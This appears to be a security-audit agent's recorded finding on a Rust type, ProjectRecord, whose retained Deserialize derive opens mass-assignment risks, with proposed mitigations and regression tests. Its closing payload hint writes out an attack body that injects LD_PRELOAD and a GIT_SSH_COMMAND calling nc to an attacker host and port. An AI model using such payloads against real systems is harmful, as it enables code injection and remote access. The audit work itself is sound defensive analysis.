record_exploration_finding
{
  "path": "crates/nyctos-types/src/project.rs",
  "line": 54,
  "cap": "MASS_ASSIGNMENT_VIA_WIRE_DESERIALIZE",
  "endpoint": "any future Json<ProjectRecord> handler; near-term: replay/import/sync routes",
  "rationale": "Fourth recurrence of the meta-pattern flagged in #78 (RepoSource::LocalPath), #79 (GitAuth::TokenEnv), #80 (GitAuth::SshKey), and #81 (RunRecord). This diff hoists `ProjectRecord` from `nyctos-core/store/project.rs` (where it had `Serialize + Deserialize` but was constructed exclusively by the sqlx hydration paths at store/project.rs:73-82, 121-129, 145-153, 170-179 — i.e. only ever from a trusted DB row) into `nyctos-types/src/project.rs:54-65` and ADDS `#[derive(TS)]`, but RETAINS `Deserialize`. The Deserialize derive on a `pub` type in `nyctos-types` is the architectural defect: any axum handler in any workspace crate can now accept `Json<ProjectRecord>` (or `Json<{ project: ProjectRecord }>`, or a replay-bundle deserialiser that ingests serialised audit-log entries containing ProjectRecord shapes) and the deserialiser will accept ALL seven fields verbatim. Concrete wire-forgery primitives (none of which any existing endpoint accepts today, but each of which is one new route away):\n\n  (A) **`id: String` is unbounded and unvalidated** — the field is a free-form string with no regex, no length cap, no charset restriction, and crucially no rejection of the bootstrap-singleton id. `crates/nyctos-core/src/store/project.rs:14` defines `pub const DEFAULT_PROJECT_ID: &str = \"default-project\";` and `ensure_default` (project.rs:88-105) returns the existing row if one with that id is already present. A future `POST /api/v1/projects/import` (natural for nyctos-replay-bundle reconstruction; the doc comment at project.rs:9-13 explicitly says the type is the on-the-wire shape for `POST /projects`) that calls `INSERT OR REPLACE INTO projects ...` with a wire-supplied id lets any bearer-holder REPLACE the default project's env_config_json with attacker-controlled content. The replaced env then flows into every subsequent scan that resolves against the default project — exactly the env-injection sink that finding #89 documents — but via a SHORTER chain because the attacker controls the `id` directly. Even without REPLACE semantics, a future `PUT /api/v1/projects/:id` that mass-assigns `created_at` lets the attacker rewrite history (set `created_at = 0` to make the project look older than the daemon's first scan, hiding it from any 'recently-touched' operator dashboard).\n\n  (B) **`created_at: i64` and `updated_at: i64` are wire-forgeable timestamps** — once `Json<ProjectRecord>` lands on any route, a wire-supplied `created_at = i64::MIN` or `i64::MAX` corrupts the time-ordered indices used by the SPA project list (`ProjectList.tsx` sorts by `updated_at` by default per the diff's deleted hand-rolled interface). Concrete consequences: (i) **audit-trail tampering** — an attacker who later legitimately gains read access can claim a forged project was provisioned years ago, hiding the fact that it was inserted yesterday for credential exfil; (ii) **integer arithmetic overflow** at any consumer that computes `now - created_at` (e.g. UI 'X days ago' widget, or any per-project retention policy that deletes rows older than N days); (iii) **clock-skew injection** that defeats time-bound rate limiters keyed off `updated_at`.\n\n  (C) **`env_config_json: Option<String>` is doubly hazardous on the Deserialize path** — distinct from #89 (which addresses the PATCH endpoint's serde_json::Value path that re-serialises to a string), the Deserialize hoist creates a SECOND path where a wire caller submits the already-stringified env. The deserialiser performs ZERO validation that the string is even valid JSON, much less that the JSON shape is an object of string→string. A future `Json<ProjectRecord>` route accepts `env_config_json: \"not even json\\u0000\\x07\\x1b[31mEVIL\"` and the store happily INSERTs the bytes. Any downstream consumer that does `serde_json::from_str(&row.env_config_json.unwrap())` propagates the parse error (acceptable); any consumer that treats the column as opaque text and forwards it to a shell command, log line, or compose extension propagates the control characters (cf. finding #89's `x-nyx-env-config` compose extension at crates/nyctos-sandbox/src/env/compose.rs:235-238 which YAML-encodes the string — a control-character payload in the string poisons the YAML output and can break out of the extension scalar into the surrounding compose document, enabling arbitrary service definition injection a la a YAML deserialisation attack).\n\n  (D) **`name: String` is unique-constrained in DB but not in deserialiser** — name uniqueness is enforced by `get_by_name` (store/project.rs:132) only on the create path. A wire-supplied `Json<ProjectRecord>` with a name that collides with an existing project's name will hit the UNIQUE constraint at INSERT (rejected), but a future PUT-by-id path that updates the name silently bypasses the uniqueness check (the existing patch_project at router.rs:594 doesn't allow name updates, but a Json<ProjectRecord>-shaped UPSERT does). Two projects with the same name break every UI that displays the project list and break audit queries that JOIN by name (the SPA's project breadcrumb at ProjectList.tsx renders names without disambiguating ids).\n\n  (E) **Deny-list bypass via Unicode lookalike in `name`** — same defect as the Cyrillic-status side-channel in finding #81: a wire-supplied name `\"default\"` (with a Cyrillic 'a' U+0430 instead of ASCII 'a') passes a naive `name == \"default\"` deny-list (used as the test against impersonating the bootstrap project) while displaying identically in the UI. The deny-list in `ensure_default` (project.rs:88-105) checks by id, not by name, but any operator-facing UI that surfaces 'default' specially will be fooled.\n\nDistinct from #78-#81: those four address `nyctos-types::repo` and `nyctos-types::run`; this is the FIFTH instance at `nyctos-types::project`. The unifying meta-finding (called out in #81's mitigation 4) was: **every type hoisted from a per-crate internal module into `nyctos-types` should require an explicit security-review checklist before adding `#[derive(Deserialize)]`**. This diff is the literal recurrence the meta-finding predicted; the diff was reviewed and shipped without the checklist being run. The doc comment at project.rs:9-13 says 'on-the-wire shape of one row in the projects table' which is precisely the language #81 flagged as the smell — it conflates 'serialised TO the wire' (Serialize, no risk) with 'deserialised FROM the wire' (Deserialize, full mass-assignment surface).\n\nMitigations (recommend 1+2+5; 3+4 are architectural):\n\n  (1) **Remove `Deserialize` from `ProjectRecord`** — the type is only constructed from sqlx rows in `crates/nyctos-core/src/store/project.rs:73-179`; no Rust code calls `serde_json::from_str::<ProjectRecord>`. The derive is dead weight and a mass-assignment surface. Replace with `#[derive(Debug, Clone, PartialEq, Eq, Serialize, TS)]`. The `Deserialize` removal is a one-line breakage check via `cargo check --workspace`.\n\n  (2) **Add `#[serde(deserialize_with)]` clamps on every primitive field** (defense-in-depth in case #1 is reverted): `id` must match `^proj-[A-Za-z0-9_-]{1,64}$` and must NOT equal `DEFAULT_PROJECT_ID`; `name` must match `^[A-Za-z0-9_ -]{1,64}$` (ASCII-only to defeat Cyrillic lookalikes); `created_at`/`updated_at` must satisfy `0 < v < now() + 24h`; `env_config_json`, if Some, must be a valid `serde_json::Value::Object` of `String → String` (parse and re-check, then re-serialise canonically to defeat control-character payloads).\n\n  (3) **Split into `ProjectRecord` (internal, no Deserialize) and `ProjectRecordWire` (Serialize+TS only, the SPA-facing shape)** — same pattern as #81 mitigation (1) for `RunRecord`. Decouples storage shape from wire shape so a future field added to the DB row doesn't auto-export to the public TS surface.\n\n  (4) **Workspace-level lint** — same defense as #78/#81 mitigation (4): build.rs-time scan fails the build for any new `#[derive(Deserialize)]` on a public item in `nyctos-types::*` unless the item carries `#[nyctos_lint::wire_input_audited(reason = \"...\")]`. This diff would have FAILED CI under that lint.\n\n  (5) **Behavioural regression tests** in `nyctos-types/tests/project.rs`:\n    - `project_record_does_not_implement_deserialize_today` — compile-time `static_assertions::assert_not_impl_all!(ProjectRecord: serde::de::Deserialize)`. Under mitigation (1) PASSES; today FAILS.\n    - `project_record_deserialise_refuses_default_id` — `serde_json::from_str::<ProjectRecord>(r#\"{\"id\":\"default-project\",...}\"#)` returns Err. Under mitigation (2) PASSES.\n    - `project_record_deserialise_refuses_overflow_timestamps` — `... \"created_at\": -1` returns Err.\n    - `project_record_deserialise_refuses_unicode_lookalike_name` — `... \"name\": \"defаult\"` (Cyrillic а U+0430) returns Err under (2).\n    - `project_record_deserialise_refuses_invalid_env_config_json` — `... \"env_config_json\": \"not json\\u0000\"` returns Err under (2).\n\n  (6) **Document the wire-contract risk** at `nyctos-types/src/project.rs:9-13` — the current doc comment SAYS 'on-the-wire shape of one row' without distinguishing serialise-from-DB-to-SPA from deserialise-from-SPA-to-DB. Add: `// SECURITY: This type derives Deserialize but no current handler accepts Json<ProjectRecord>. Adding such a handler reopens mass-assignment surfaces enumerated in sentinel #92. See also #78-81 for the recurring meta-pattern across nyctos-types hoists.`",
  "suggested_payload_hint": "Once any Json<ProjectRecord> handler lands (e.g. POST /api/v1/projects/import): `{\"id\":\"default-project\",\"name\":\"default\",\"description\":null,\"target_base_url\":\"http://attacker.example\",\"env_config_json\":\"{\\\"LD_PRELOAD\\\":\\\"/tmp/x.so\\\",\\\"GIT_SSH_COMMAND\\\":\\\"ssh -o ProxyCommand=nc attacker 4444 %h %p\\\"}\",\"created_at\":0,\"updated_at\":0}` — replaces the bootstrap project's env in one call. Verify today via `cargo check`: `let r: ProjectRecord = serde_json::from_str(r#\"{\\\"id\\\":\\\"default-project\\\",...,\\\"created_at\\\":-9223372036854775808,\\\"updated_at\\\":9223372036854775807}\"#).unwrap();` — succeeds; under mitigation (1) or (2) fails."
}

